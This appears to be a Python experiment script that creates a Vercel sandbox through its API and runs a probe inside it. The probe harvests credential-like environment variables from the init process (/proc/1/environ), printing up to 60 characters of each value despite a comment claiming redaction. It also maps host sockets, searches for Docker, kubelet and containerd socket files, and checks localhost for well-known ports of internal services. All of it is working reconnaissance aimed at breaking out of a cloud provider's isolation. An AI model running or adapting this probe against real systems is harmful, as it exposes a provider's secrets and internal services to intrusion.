# 实验J91: 宿主内部服务面 — /proc/1/environ 凭证 + 共享 net ns TCP 监听 + socket 文件
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj91"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import os, re

print("== [1] sandbox-init environ (/proc/1/environ) ==", flush=True)
try:
    data = open("/proc/1/environ", "rb").read()
    print(f"  size={len(data)}", flush=True)
    for item in data.split(b"\x00"):
        if not item:
            continue
        try:
            line = item.decode(errors="replace")
        except Exception:
            line = repr(item)
        # 脱敏打印: 只显示 key 和前 40 字符
        k, _, v = line.partition("=")
        if any(s in k.upper() for s in ("TOKEN", "SECRET", "KEY", "PASS", "AUTH", "CRED", "SIGN", "PRIVATE")):
            print(f"  [!] {k}={v[:60]}", flush=True)
        elif len(line) < 120:
            print(f"  {line}", flush=True)
except Exception as e:
    print("  ERR", e, flush=True)

print("== [2] sandbox-init cmdline ==", flush=True)
try:
    print("  ", open("/proc/1/cmdline", "rb").read().replace(b"\x00", b" ").decode(), flush=True)
except Exception as e:
    print("  ERR", e, flush=True)

print("== [3] 宿主 TCP/UDP 监听 (共享 net ns) ==", flush=True)
r = os.popen("ss -tlnp 2>/dev/null | head -40").read()
print(r, flush=True)
r = os.popen("ss -ulnp 2>/dev/null | head -20").read()
print(r, flush=True)

print("== [4] socket 文件扫描 (/proc/1/root) ==", flush=True)
import subprocess
out = subprocess.run(["find", "/proc/1/root", "-xdev", "-type", "s", "-o", "-type", "f", "-name", "*.sock", "-o", "-name", "*docker*", "-o", "-name", "*kubelet*", "-o", "-name", "*containerd*"],
                     capture_output=True, text=True, timeout=40)
print("  find:", flush=True)
for line in out.stdout.splitlines()[:40]:
    print("   ", line, flush=True)
print("  find-err:", out.stderr[:200], flush=True)

print("== [5] 127.0.0.1 快速端口检查 (仅已知服务端口) ==", flush=True)
import socket
for port in [26661, 3000, 8080, 5000, 6443, 10250, 2375, 2376, 9090, 8500, 8200, 4000, 9091]:
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=2)
        s.close()
        print(f"  127.0.0.1:{port} OPEN", flush=True)
    except Exception:
        pass
print("  port scan done", flush=True)
"""
run_cmd(sid, PROBE, "host-svc", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
